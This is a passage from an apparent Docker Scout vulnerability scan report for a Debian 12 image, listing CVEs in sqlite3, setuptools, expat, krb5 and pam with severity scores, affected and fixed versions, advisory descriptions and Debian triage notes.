https://gist.github.com/cnwangjihe/f496393f30f5ecec5b18c8f5ab072054
zipfile extension not build for Debian binary package builds

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-29088?s=debian&n=sqlite3&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2025--29088" src="https://img.shields.io/badge/CVE--2025--29088-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.039%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In SQLite 3.49.0 before 3.49.1, certain argument values to sqlite3_db_config (in the C-language API) can cause a denial of service (application crash). An sz*nBig multiplication is not cast to a 64-bit integer, and consequently some memory allocations may be incorrect.

---
- sqlite3 3.46.1-4 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1102670; unimportant)
https://github.com/sqlite/sqlite/commit/56d2fd008b108109f489339f5fd55212bb50afd4
https://sqlite.org/src/info/1ec4c308c76c69fb
OOB to setup API; API in question is only accessible from programms that invoke
SQLite. Not reachable from rouge SQL inputs or specially crafted database files.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-45346?s=debian&n=sqlite3&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2021--45346" src="https://img.shields.io/badge/CVE--2021--45346-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.271%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>51st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A Memory Leak vulnerability exists in SQLite Project SQLite3 3.35.1 and 3.37.0 via maliciously crafted SQL Queries (made via editing the Database File), it is possible to query a record, and leak subsequent bytes of memory that extend beyond the record, which could let a malicious user obtain sensitive information. NOTE: The developer disputes this as a vulnerability stating that If you give SQLite a corrupted database file and submit a query against the database, it might read parts of the database that you did not intend or expect.

---
- sqlite3 <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1005974)
- sqlite <removed> (unimportant)
https://github.com/guyinatuxedo/sqlite3_record_leaking
https://bugzilla.redhat.com/show_bug.cgi?id=2054793
https://sqlite.org/forum/forumpost/056d557c2f8c452ed5bb9c215414c802b215ce437be82be047726e521342161e
Negligible security impact

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 3" src="https://img.shields.io/badge/H-3-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>setuptools</strong> <code>57.5.0</code> (pypi)</summary>

<small><code>pkg:pypi/setuptools@57.5.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2022-40897?s=github&n=setuptools&t=pypi&vr=%3C65.5.1"><img alt="high 8.7: CVE--2022--40897" src="https://img.shields.io/badge/CVE--2022--40897-lightgrey?label=high%208.7&labelColor=e25d68"/></a> <i>Inefficient Regular Expression Complexity</i>

<table>
<tr><td>Affected range</td><td><code><65.5.1</code></td></tr>
<tr><td>Fixed version</td><td><code>65.5.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:L/SI:L/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.513%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>67th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Python Packaging Authority (PyPA)'s setuptools is a library designed to facilitate packaging Python projects. Setuptools version 65.5.0 and earlier could allow remote attackers to cause a denial of service by fetching malicious HTML from a PyPI package or custom PackageIndex page due to a vulnerable Regular Expression in `package_index`. This has been patched in version 65.5.1.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-47273?s=github&n=setuptools&t=pypi&vr=%3C78.1.1"><img alt="high 7.7: CVE--2025--47273" src="https://img.shields.io/badge/CVE--2025--47273-lightgrey?label=high%207.7&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><78.1.1</code></td></tr>
<tr><td>Fixed version</td><td><code>78.1.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.120%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>31st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary 
A path traversal vulnerability in `PackageIndex` was fixed in setuptools version 78.1.1

### Details
```
    def _download_url(self, url, tmpdir):
        # Determine download filename
        #
        name, _fragment = egg_info_for_url(url)
        if name:
            while '..' in name:
                name = name.replace('..', '.').replace('\\', '_')
        else:
            name = "__downloaded__"  # default if URL has no path contents

        if name.endswith('.[egg.zip](http://egg.zip/)'):
            name = name[:-4]  # strip the extra .zip before download

 -->       filename = os.path.join(tmpdir, name)
```

Here: https://github.com/pypa/setuptools/blob/6ead555c5fb29bc57fe6105b1bffc163f56fd558/setuptools/package_index.py#L810C1-L825C88

`os.path.join()` discards the first argument `tmpdir` if the second begins with a slash or drive letter.
`name` is derived from a URL without sufficient sanitization. While there is some attempt to sanitize by replacing instances of '..' with '.', it is insufficient.

### Risk Assessment
As easy_install and package_index are deprecated, the exploitation surface is reduced.
However, it seems this could be exploited in a similar fashion like https://github.com/advisories/GHSA-r9hx-vwmv-q579, and as described by POC 4 in https://github.com/advisories/GHSA-cx63-2mw6-8hw5 report: via malicious URLs present on the pages of a package index.

### Impact
An attacker would be allowed to write files to arbitrary locations on the filesystem with the permissions of the process running the Python code, which could escalate to RCE depending on the context.

### References
https://huntr.com/bounties/d6362117-ad57-4e83-951f-b8141c6e7ca5
https://github.com/pypa/setuptools/issues/4946

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-6345?s=github&n=setuptools&t=pypi&vr=%3C70.0.0"><img alt="high 7.5: CVE--2024--6345" src="https://img.shields.io/badge/CVE--2024--6345-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Improper Control of Generation of Code ('Code Injection')</i>

<table>
<tr><td>Affected range</td><td><code><70.0.0</code></td></tr>
<tr><td>Fixed version</td><td><code>70.0.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>9.639%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>93rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability in the `package_index` module of pypa/setuptools versions up to 69.1.1 allows for remote code execution via its download functions. These functions, which are used to download packages from URLs provided by users or retrieved from package index servers, are susceptible to code injection. If these functions are exposed to user-controlled inputs, such as package URLs, they can execute arbitrary commands on the system. The issue is fixed in version 70.0.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 3" src="https://img.shields.io/badge/L-3-fce1a9"/> <!-- unspecified: 0 --><strong>expat</strong> <code>2.5.0-1+deb12u1</code> (deb)</summary>

<small><code>pkg:deb/debian/expat@2.5.0-1%2Bdeb12u1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-8176?s=debian&n=expat&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.5.0-1%2Bdeb12u2"><img alt="high : CVE--2024--8176" src="https://img.shields.io/badge/CVE--2024--8176-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.5.0-1+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>2.5.0-1+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.803%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>75th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A stack overflow vulnerability exists in the libexpat library due to the way it handles recursive entity expansion in XML documents. When parsing an XML document with deeply nested entity references, libexpat can be forced to recurse indefinitely, exhausting the stack space and causing a crash. This issue could lead to denial of service (DoS) or, in some cases, exploitable memory corruption, depending on the environment and library usage.

---
- expat 2.7.0-1
[bookworm] - expat 2.5.0-1+deb12u2
[bullseye] - expat <ignored> (Minor issue and too intrusive to backport)
- libxmltok <removed>
[bookworm] - libxmltok <ignored> (Minor issue, no runtime dependencies left)
https://blog.hartwork.org/posts/expat-2-7-0-released/
https://github.com/libexpat/libexpat/issues/893
https://github.com/libexpat/libexpat/pull/973
CentOS stream backport for 2.5.0: https://gitlab.com/redhat/centos-stream/rpms/expat/-/blob/c9s/expat-2.5.0-CVE-2024-8176.patch
https://www.openwall.com/lists/oss-security/2025/09/24/11
Follow-up: https://github.com/libexpat/libexpat/pull/1059 (R_2_7_3)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-52425?s=debian&n=expat&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.5.0-1%2Bdeb12u2"><img alt="high : CVE--2023--52425" src="https://img.shields.io/badge/CVE--2023--52425-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.5.0-1+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>2.5.0-1+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.552%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>82nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libexpat through 2.5.0 allows a denial of service (resource consumption) because many full reparsings are required in the case of a large token for which multiple buffer fills are needed.

---
- expat 2.6.0-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1063238)
[bookworm] - expat 2.5.0-1+deb12u2
- libxmltok <removed>
[bookworm] - libxmltok <ignored> (Minor issue, no runtime dependencies left)
https://github.com/libexpat/libexpat/pull/789
Merge commit: https://github.com/libexpat/libexpat/commit/34b598c5f594b015c513c73f06e7ced3323edbf1

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-50602?s=debian&n=expat&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.5.0-1%2Bdeb12u2"><img alt="medium : CVE--2024--50602" src="https://img.shields.io/badge/CVE--2024--50602-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.5.0-1+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>2.5.0-1+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.116%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>30th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in libexpat before 2.6.4. There is a crash within the XML_ResumeParser function because XML_StopParser can stop/suspend an unstarted parser.

---
- expat 2.6.3-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1086134)
[bookworm] - expat 2.5.0-1+deb12u2
- libxmltok <removed>
[bookworm] - libxmltok <ignored> (Minor issue, no runtime dependencies left)
https://github.com/libexpat/libexpat/pull/915
https://github.com/libexpat/libexpat/commit/51c7019069b862e88d94ed228659e70bddd5de09 (R_2_6_4)
https://github.com/libexpat/libexpat/commit/5fb89e7b3afa1c314b34834fe729cd063f65a4d4 (R_2_6_4)
https://github.com/libexpat/libexpat/commit/b3836ff534c7cc78128fe7b935aad3d4353814ed (R_2_6_4)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-50219?s=debian&n=expat&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="medium : CVE--2026--50219" src="https://img.shields.io/badge/CVE--2026--50219-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.015%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libexpat before 2.8.2 lacks handler call depth tracking for calls to XML_GetBuffer, XML_Parse, XML_ParseBuffer, XML_ParserFree, or XML_ParserReset from within handlers in cases of a policy violation. Thus, a use-after-free can occur,

---
- expat <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1138862)
https://github.com/libexpat/libexpat/pull/1246

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-45186?s=debian&n=expat&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2026--45186" src="https://img.shields.io/badge/CVE--2026--45186-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.012%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In libexpat before 2.8.1, the computational complexity of attribute name collision checks allows a denial of service via moderately sized crafted XML input.

---
- expat 2.8.0-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1136164)
https://github.com/libexpat/libexpat/pull/1216
https://blog.hartwork.org/posts/expat-2-8-1-released/

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-28757?s=debian&n=expat&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2024--28757" src="https://img.shields.io/badge/CVE--2024--28757-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.195%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>79th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libexpat through 2.6.1 allows an XML Entity Expansion attack when there is isolated use of external parsers (created via XML_ExternalEntityParserCreate).

---
- expat 2.6.1-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1065868; unimportant)
- libxmltok <removed>
[bookworm] - libxmltok <ignored> (Minor issue, no runtime dependencies left)
https://github.com/libexpat/libexpat/pull/842
https://github.com/libexpat/libexpat/issues/839
Fixed by: https://github.com/libexpat/libexpat/commit/1d50b80cf31de87750103656f6eb693746854aa8
Tests: https://github.com/libexpat/libexpat/commit/072eca0b72373da103ce15f8f62d1d7b52695454
Expat provides API to mitigate expansion attacks, ultimately under control of the app using Expat
Cf. Billion laughs attack assessment for src:expat in CVE-2013-0340.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-52426?s=debian&n=expat&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2023--52426" src="https://img.shields.io/badge/CVE--2023--52426-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.022%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libexpat through 2.5.0 allows recursive XML Entity Expansion if XML_DTD is undefined at compile time.

---
- expat 2.6.0-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1063240; unimportant)
- libxmltok <removed>
[bookworm] - libxmltok <ignored> (Minor issue, no runtime dependencies left)
https://github.com/libexpat/libexpat/pull/777
https://github.com/libexpat/libexpat/commit/0f075ec8ecb5e43f8fdca5182f8cca4703da0404
https://github.com/libexpat/libexpat/pull/777#issuecomment-1965172301
CVE is for fixing billion laughs attacks for users compiling *without* XML_DTD defined,
which is not the case for Debian.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 3" src="https://img.shields.io/badge/M-3-fbb552"/> <img alt="low: 4" src="https://img.shields.io/badge/L-4-fce1a9"/> <!-- unspecified: 0 --><strong>krb5</strong> <code>1.20.1-2+deb12u2</code> (deb)</summary>

<small><code>pkg:deb/debian/krb5@1.20.1-2%2Bdeb12u2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-24528?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.20.1-2%2Bdeb12u3"><img alt="high : CVE--2025--24528" src="https://img.shields.io/badge/CVE--2025--24528-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.20.1-2+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>1.20.1-2+deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.206%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>43rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In MIT Kerberos 5 (aka krb5) before 1.22 (with incremental propagation), there is an integer overflow for a large update size to resize() in kdb_log.c. An authenticated attacker can cause an out-of-bounds write and kadmind daemon crash.

---
- krb5 1.21.3-5 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1094730)
[bookworm] - krb5 1.20.1-2+deb12u3
https://bugzilla.redhat.com/show_bug.cgi?id=2342796
Fixed by: https://github.com/krb5/krb5/commit/78ceba024b64d49612375be4a12d1c066b0bfbd0

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-40356?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.20.1-2%2Bdeb12u5"><img alt="medium : CVE--2026--40356" src="https://img.shields.io/badge/CVE--2026--40356-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.20.1-2+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>1.20.1-2+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.108%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>29th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In MIT Kerberos 5 (aka krb5) before 1.22.3, there is an integer underflow and resultant out-of-bounds read if an application calls gss_accept_sec_context() on a system with a NegoEx mechanism registered in /etc/gss/mech. An unauthenticated remote attacker can trigger this, possibly causing the process to terminate in parse_message.

---
- krb5 1.22.1-2.1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135317)
https://github.com/krb5/krb5/commit/2e75f0d9362fb979f5fc92829431a590a130929f

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-40355?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.20.1-2%2Bdeb12u5"><img alt="medium : CVE--2026--40355" src="https://img.shields.io/badge/CVE--2026--40355-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.20.1-2+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>1.20.1-2+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.108%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>29th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In MIT Kerberos 5 (aka krb5) before 1.22.3, there is a NULL pointer dereference if an application calls gss_accept_sec_context() on a system with a NegoEx mechanism registered in /etc/gss/mech. An unauthenticated remote attacker can trigger this, causing the process to terminate in parse_nego_message.

---
- krb5 1.22.1-2.1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135317)
https://github.com/krb5/krb5/commit/2e75f0d9362fb979f5fc92829431a590a130929f

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-3576?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.20.1-2%2Bdeb12u4"><img alt="medium : CVE--2025--3576" src="https://img.shields.io/badge/CVE--2025--3576-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.20.1-2+deb12u4</code></td></tr>
<tr><td>Fixed version</td><td><code>1.20.1-2+deb12u4</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.252%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>49th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability in the MIT Kerberos implementation allows GSSAPI-protected messages using RC4-HMAC-MD5 to be spoofed due to weaknesses in the MD5 checksum design. If RC4 is preferred over stronger encryption types, an attacker could exploit MD5 collisions to forge message integrity codes. This may lead to unauthorized message tampering.

---
- krb5 1.21.2-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1103525)
[bookworm] - krb5 1.20.1-2+deb12u4
https://bugzilla.redhat.com/show_bug.cgi?id=2359465
CVE relates to issues covered in:
https://i.blackhat.com/EU-22/Thursday-Briefings/EU-22-Tervoort-Breaking-Kerberos-RC4-Cipher-and-Spoofing-Windows-PACs-wp.pdf
Since upstream 1.21 (cf. https://web.mit.edu/kerberos/krb5-1.21/) the KDC
will no longer issue tickets with RC4 or triple-DES session keys unless
explicitly configured with the new allow_rc4 or allow_des3 variables respectively.
https://github.com/krb5/krb5/commit/1b57a4d134bbd0e7c52d5885a92eccc815726463
https://github.com/krb5/krb5/commit/2cbd847e0e92bc4e219b65c770ae33f851b22afc

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-26462?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.20.1-2%2Bdeb12u3"><img alt="low : CVE--2024--26462" src="https://img.shields.io/badge/CVE--2024--26462-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.20.1-2+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>1.20.1-2+deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.024%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Kerberos 5 (aka krb5) 1.21.2 contains a memory leak vulnerability in /krb5/src/kdc/ndr.c.

---
- krb5 1.21.3-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1064965)
[bookworm] - krb5 1.20.1-2+deb12u3
[bullseye] - krb5 <not-affected> (Vulnerable code introduced later)
[buster] - krb5 <not-affected> (Vulnerable code introduced later)
https://github.com/LuMingYinDetect/krb5_defects/blob/main/krb5_detect_3.md
Introduced by: https://github.com/krb5/krb5/commit/c85894cfb784257a6acb4d77d8c75137d2508f5e (krb5-1.20-beta1)
Fixed by: https://github.com/krb5/krb5/commit/7d0d85bf99caf60c0afd4dcf91b0c4c683b983fe (master)
Fixed by: https://github.com/krb5/krb5/commit/0c2de238b5bf1ea4578e3933a604c7850905b8be (krb5-1.21.3-final)
https://mailman.mit.edu/pipermail/kerberos/2024-March/023095.html

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-26461?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2024--26461" src="https://img.shields.io/badge/CVE--2024--26461-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.081%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Kerberos 5 (aka krb5) 1.21.2 contains a memory leak vulnerability in /krb5/src/lib/gssapi/krb5/k5sealv3.c.

---
- krb5 <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1098754; unimportant)
https://github.com/LuMingYinDetect/krb5_defects/blob/main/krb5_detect_2.md
Fixed by: https://github.com/krb5/krb5/commit/c5f9c816107f70139de11b38aa02db2f1774ee0d
Codepath cannot be triggered via API calls, negligible security impact
https://mailman.mit.edu/pipermail/kerberos/2024-March/023095.html

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-26458?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2024--26458" src="https://img.shields.io/badge/CVE--2024--26458-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.250%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>49th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Kerberos 5 (aka krb5) 1.21.2 contains a memory leak in /krb5/src/lib/rpc/pmap_rmt.c.

---
- krb5 <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1098754; unimportant)
https://github.com/LuMingYinDetect/krb5_defects/blob/main/krb5_detect_1.md
Fixed by: https://github.com/krb5/krb5/commit/c5f9c816107f70139de11b38aa02db2f1774ee0d
Unused codepath, negligible security impact
https://mailman.mit.edu/pipermail/kerberos/2024-March/023095.html

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-5709?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2018--5709" src="https://img.shields.io/badge/CVE--2018--5709-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.640%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>82nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in MIT Kerberos 5 (aka krb5) through 1.16. There is a variable "dbentry->n_key_data" in kadmin/dbutil/dump.c that can store 16-bit data but unknowingly the developer has assigned a "u4" variable to it, which is for 32-bit data. An attacker can use this vulnerability to affect other artifacts of the database as we know that a Kerberos database dump file contains trusted data.

---
- krb5 <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=889684)
https://github.com/poojamnit/Kerberos-V5-1.16-Vulnerabilities/tree/master/Integer%20Overflow
non-issue, codepath is only run on trusted input, potential integer
overflow is non-issue

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>pam</strong> <code>1.5.2-6+deb12u1</code> (deb)</summary>

<small><code>pkg:deb/debian/pam@1.5.2-6%2Bdeb12u1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-6020?s=debian&n=pam&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.5.2-6%2Bdeb12u2"><img alt="high : CVE--2025--6020" src="https://img.shields.io/badge/CVE--2025--6020-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.5.2-6+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>1.5.2-6+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.072%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in linux-pam. The module pam_namespace may use access user-controlled paths without proper protection, allowing local users to elevate their privileges to root via multiple symlink attacks and race conditions.

---
[experimental] - pam 1.7.0-4
- pam 1.7.0-5 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1107919)
[bookworm] - pam 1.5.2-6+deb12u2
https://www.openwall.com/lists/oss-security/2025/06/17/1
https://github.com/linux-pam/linux-pam/security/advisories/GHSA-f9p8-gjr4-j9gx
Fixed by: https://github.com/linux-pam/linux-pam/commit/475bd60c552b98c7eddb3270b0b4196847c0072e (v1.7.1)
Fixed by: https://github.com/linux-pam/linux-pam/commit/592d84e1265d04c3104acee815a503856db503a1 (v1.7.1)
Fixed by: https://github.com/linux-pam/linux-pam/commit/976c20079358d133514568fc7fd95c02df8b5773 (v1.7.1)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-22365?s=debian&n=pam&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.5.2-6%2Bdeb12u2"><img alt="medium : CVE--2024--22365" src="https://img.shields.io/badge/CVE--2024--22365-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
